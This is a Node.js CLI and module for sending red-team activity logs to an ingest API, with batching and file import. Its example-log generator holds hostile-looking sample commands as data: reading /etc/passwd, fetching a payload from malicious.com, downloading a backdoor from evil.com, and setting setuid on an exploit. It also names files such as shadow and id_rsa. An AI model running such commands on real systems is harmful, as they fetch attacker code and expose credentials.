// node-api-client.js
const axios = require('axios');
const fs = require('fs');
const readline = require('readline');

class RedTeamLoggerClient {
  constructor(baseUrl, apiKey) {
    this.baseUrl = baseUrl.endsWith('/') ? baseUrl.slice(0, -1) : baseUrl;
    this.apiKey = apiKey;
    this.client = axios.create({
      baseURL: this.baseUrl,
      headers: {
        'Content-Type': 'application/json',
        'X-API-Key': this.apiKey
      }
    });
  }

  /**
   * Check API status and key validity
   */
  async checkStatus() {
    try {
      const response = await this.client.get('/status');
      return response.data;
    } catch (error) {
      handleApiError(error);
      return null;
    }
  }

  /**
   * Send a single log entry
   * @param {Object} logData - The log data to send
   */
  async sendLog(logData) {
    try {
      const response = await this.client.post('/logs', logData);
      return response.data;
    } catch (error) {
      handleApiError(error);
      return null;
    }
  }

  /**
   * Send multiple log entries in a batch
   * @param {Array} logs - Array of log objects to send
   */
  async sendLogsBatch(logs) {
    if (!logs || logs.length === 0) {
      console.log('No logs to send');
      return null;
    }

    // Handle API batch size limit of 50 logs
    if (logs.length > 50) {
      console.log(`Batch size (${logs.length}) exceeds maximum (50). Splitting into multiple requests.`);
      const results = [];
      
      for (let i = 0; i < logs.length; i += 50) {
        const batch = logs.slice(i, i + 50);
        console.log(`Sending batch ${Math.floor(i/50) + 1} of ${Math.ceil(logs.length/50)} (${batch.length} logs)...`);
        
        try {
          const result = await this.sendLogsBatch(batch);
          if (result) {
            results.push(result);
          }
        } catch (error) {
          console.error(`Error sending batch ${Math.floor(i/50) + 1}:`, error.message);
        }
        
        // Add a small delay to avoid rate limiting
        if (i + 50 < logs.length) {
          await new Promise(resolve => setTimeout(resolve, 1000));
        }
      }
      
      return results;
    }

    try {
      const response = await this.client.post('/logs', logs);
      return response.data;
    } catch (error) {
      handleApiError(error);
      return null;
    }
  }
}

// Helper to handle API errors
function handleApiError(error) {
  console.error('API Error:');
  
  if (error.response) {
    // The server responded with a status code outside the 2xx range
    console.error(`Status: ${error.response.status}`);
    console.error('Response:', error.response.data);
  } else if (error.request) {
    // The request was made but no response was received
    console.error('No response received from server');
  } else {
    // Something happened in setting up the request
    console.error('Error:', error.message);
  }
}

// Generate an example log
function createExampleLog() {
  return {
    internal_ip: "192.168.1." + Math.floor(Math.random() * 255),
    external_ip: "203.0.113." + Math.floor(Math.random() * 255),
    hostname: "host-" + Math.floor(Math.random() * 100),
    domain: "example.org",
    username: ["admin", "root", "jsmith", "system"][Math.floor(Math.random() * 4)],
    command: [
      "cat /etc/passwd",
      "ls -la /var/www",
      "curl -s http://malicious.com/payload > /tmp/payload",
      "wget http://evil.com/backdoor",
      "chmod +s /tmp/exploit"
    ][Math.floor(Math.random() * 5)],
    notes: "Suspicious activity detected",
    filename: ["passwd", "shadow", "bash_history", "id_rsa"][Math.floor(Math.random() * 4)],
    status: ["ON_DISK", "IN_MEMORY", "REMOVED", "CLEANED"][Math.floor(Math.random() * 4)]
  };
}

// Helper function to ask questions in the CLI
function askQuestion(question) {
  return new Promise(resolve => {
    rl.question(question, answer => {
      resolve(answer);
    });
  });
}

// Interactive CLI
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

async function startCli() {
  console.log('=======================================');
  console.log('| Red Team Logger API Client |');
  console.log('=======================================\n');

  let baseUrl = '';
  let apiKey = '';

  // Get API connection details
  if (process.env.RTL_API_URL && process.env.RTL_API_KEY) {
    baseUrl = process.env.RTL_API_URL;
    apiKey = process.env.RTL_API_KEY;
    console.log('Using API URL and key from environment variables.');
  } else {
    baseUrl = await askQuestion('Enter API base URL (e.g., https://yourdomain.com/ingest): ');
    apiKey = await askQuestion('Enter your API key: ');
  }

  // Initialize client
  const client = new RedTeamLoggerClient(baseUrl, apiKey);

  // Main menu
  while (true) {
    console.log('\n===== MENU =====');
    console.log('1. Check API Status');
    console.log('2. Send a Single Log');
    console.log('3. Send Multiple Example Logs');
    console.log('4. Send Logs from JSON File');
    console.log('5. Exit');

    const choice = await askQuestion('\nEnter your choice (1-5): ');

    switch (choice) {
      case '1':
        await checkApiStatus(client);
        break;
      case '2':
        await sendSingleLog(client);
        break;
      case '3':
        await sendMultipleLogs(client);
        break;
      case '4':
        await sendLogsFromFile(client);
        break;
      case '5':
        console.log('Exiting...');
        rl.close();
        return;
      default:
        console.log('Invalid choice. Please try again.');
    }
  }
}

async function checkApiStatus(client) {
  console.log('\n--- Checking API Status ---');
  const status = await client.checkStatus();
  if (status) {
    console.log('API is accessible and your API key is valid!');
    console.log(JSON.stringify(status, null, 2));
  }
}

async function sendSingleLog(client) {
  console.log('\n--- Sending a Single Log ---');
  const log = createExampleLog();
  
  console.log('Log to be sent:');
  console.log(JSON.stringify(log, null, 2));
  
  const confirm = await askQuestion('Send this log? (y/n): ');
  if (confirm.toLowerCase() === 'y') {
    const result = await client.sendLog(log);
    if (result) {
      console.log('Log sent successfully!');
      console.log(JSON.stringify(result, null, 2));
    }
  }
}

async function sendMultipleLogs(client) {
  console.log('\n--- Sending Multiple Example Logs ---');
  const count = parseInt(await askQuestion('How many logs to send? '), 10);
  
  if (isNaN(count) || count <= 0) {
    console.log('Invalid number. Please enter a positive number.');
    return;
  }
  
  console.log(`Generating ${count} example logs...`);
  const logs = Array.from({ length: count }, () => createExampleLog());
  
  const confirm = await askQuestion(`Send ${count} logs? (y/n): `);
  if (confirm.toLowerCase() === 'y') {
    console.log(`Sending ${count} logs...`);
    const results = await client.sendLogsBatch(logs);
    if (results) {
      console.log('Logs sent successfully!');
      console.log(JSON.stringify(Array.isArray(results) ? results[0] : results, null, 2));
      
      if (Array.isArray(results) && results.length > 1) {
        console.log(`... and ${results.length - 1} more batch results`);
      }
    }
  }
}

async function sendLogsFromFile(client) {
  console.log('\n--- Sending Logs from JSON File ---');
  const filePath = await askQuestion('Enter path to JSON file: ');
  
  try {
    const fileContent = fs.readFileSync(filePath, 'utf8');
    let logs = JSON.parse(fileContent);
    
    // If the file contains a single object, convert it to an array
    if (!Array.isArray(logs)) {
      logs = [logs];
    }
    
    console.log(`Found ${logs.length} logs in the file.`);
    
    const confirm = await askQuestion(`Send ${logs.length} logs? (y/n): `);
    if (confirm.toLowerCase() === 'y') {
      console.log(`Sending ${logs.length} logs...`);
      const results = await client.sendLogsBatch(logs);
      if (results) {
        console.log('Logs sent successfully!');
        console.log(JSON.stringify(Array.isArray(results) ? results[0] : results, null, 2));
        
        if (Array.isArray(results) && results.length > 1) {
          console.log(`... and ${results.length - 1} more batch results`);
        }
      }
    }
  } catch (error) {
    console.error(`Error reading or parsing file: ${error.message}`);
  }
}

// Start the CLI
startCli().catch(err => {
  console.error('Error:', err);
  rl.close();
});

// Example usage as a module:
/*
const { RedTeamLoggerClient } = require('./node-api-client');

async function main() {
  const client = new RedTeamLoggerClient('https://yourdomain.com/ingest', 'rtl_yourkey_abc123');
  
  // Check API status
  const status = await client.checkStatus();
  console.log('Status:', status);
  
  // Send a log
  const log = {
    internal_ip: "192.168.1.100",
    hostname: "victim-host",
    command: "cat /etc/passwd",
    status: "ON_DISK"
  };
  
  const result = await client.sendLog(log);
  console.log('Result:', result);
}

main().catch(console.error);
*/

module.exports = {
  RedTeamLoggerClient
};